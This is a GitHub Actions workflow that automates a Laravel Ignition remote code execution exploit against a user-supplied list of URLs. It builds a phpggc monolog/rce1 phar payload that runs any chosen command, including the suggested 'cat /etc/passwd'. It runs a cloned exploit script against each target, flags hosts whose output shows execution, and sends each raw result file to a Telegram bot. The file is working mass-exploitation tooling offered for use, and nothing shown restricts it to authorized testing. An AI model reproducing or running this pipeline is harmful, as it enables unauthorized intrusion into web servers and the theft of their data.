name: Laravel Ignition RCE Exploit

on:
  workflow_dispatch:
    inputs:
      urls:
        description: 'URLs separated by spaces, commas, or mashed together (Just base URL, e.g., http://x.com/)'
        required: true
        type: string
      command:
        description: 'Command to execute (e.g., id, whoami, cat /etc/passwd)'
        required: true
        default: 'id'

jobs:
  laravel-exploit:
    runs-on: ubuntu-latest
    env:
      FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
    
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Dependencies
        run: |
          sudo apt-get update && sudo apt-get install -y jq zip php-cli php-gd php-mbstring php-xml php-curl
          pip3 install requests pycryptodome bs4

      - name: Clone Repositories
        run: |
          git clone https://github.com/ambionics/phpggc.git || true
          git clone https://github.com/ambionics/laravel-exploits.git || true
          
          if [ ! -f "laravel-exploits/laravel-ignition-rce.py" ]; then
            echo "ERROR: laravel-ignition-rce.py not found!"
            exit 1
          fi

      - name: Generate Phar Payload
        env:
          CMD_INPUT: ${{ github.event.inputs.command }}
        run: |
          echo ">>> Generating exploit.phar for command: ${CMD_INPUT}"
          # Generate the payload using phpggc (monolog/rce1 is standard for Laravel Ignition)
          # phpggc runs natively without needing composer
          php -d "phar.readonly=0" ./phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "$CMD_INPUT" || true
          
          if [ ! -f "/tmp/exploit.phar" ]; then
            echo "ERROR: Failed to generate exploit.phar!"
            exit 1
          fi
          echo "Successfully generated exploit.phar"

      - name: Prepare URLs
        env:
          INPUT_URLS: ${{ github.event.inputs.urls }}
        run: |
          touch urls.txt
          echo "$INPUT_URLS" | sed 's/https:/\nhttps:/g' | sed 's/http:/\nhttp:/g' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' | sort -u > urls.txt
          URL_COUNT=$(wc -l < urls.txt | xargs)
          echo "Total URLs to test: ${URL_COUNT}"

      - name: Notify Telegram Start
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          URL_COUNT=$(wc -l < urls.txt | xargs)
          MESSAGE="🦠 Laravel Ignition RCE Scanner Starting"$'\n'$'\n'"URLs: ${URL_COUNT}"$'\n'"Command: ${{ github.event.inputs.command }}"
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text=${MESSAGE}" || true

      - name: Run Exploit Script
        continue-on-error: true
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          while IFS= read -r url; do
            if [ -z "$url" ]; then continue; fi
            
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c 1-70)
            RESULT_FILE="${{ github.workspace }}/${safe_name}_laravel.txt"
            
            echo "======================================" > "$RESULT_FILE"
            echo "TESTING URL: $url" >> "$RESULT_FILE"
            echo "COMMAND: ${{ github.event.inputs.command }}" >> "$RESULT_FILE"
            echo "======================================" >> "$RESULT_FILE"
            
            # Run the Python script with the generated phar file, 60s timeout
            timeout 60 python3 laravel-exploits/laravel-ignition-rce.py "$url" /tmp/exploit.phar >> "$RESULT_FILE" 2>&1 || true
            
            # Check if the command output (e.g., 'uid=' from 'id') is in the result
            if grep -qi "uid=\|root\|nobody\|www-data\|daemon\|bin/bash\|total " "$RESULT_FILE"; then
              STATUS="🚨 VULNERABLE"
            else
              STATUS="✅ NOT VULNERABLE"
            fi
            
            # Send clean status message to Telegram
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
              -d chat_id="${TELEGRAM_CHAT_ID}" \
              --data-urlencode "text=${STATUS}: ${url}" || true
            
            # Send the raw text file output
            if [ -f "$RESULT_FILE" ] && [ -s "$RESULT_FILE" ]; then
              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
                -F chat_id="${TELEGRAM_CHAT_ID}" \
                -F document="@${RESULT_FILE}" \
                -F caption="🔬 Exploit Output - ${safe_name}" || true
            fi
            
          done < urls.txt

      - name: Pipeline Finished
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text=🛑 Laravel Exploit Pipeline Completely Finished" || true
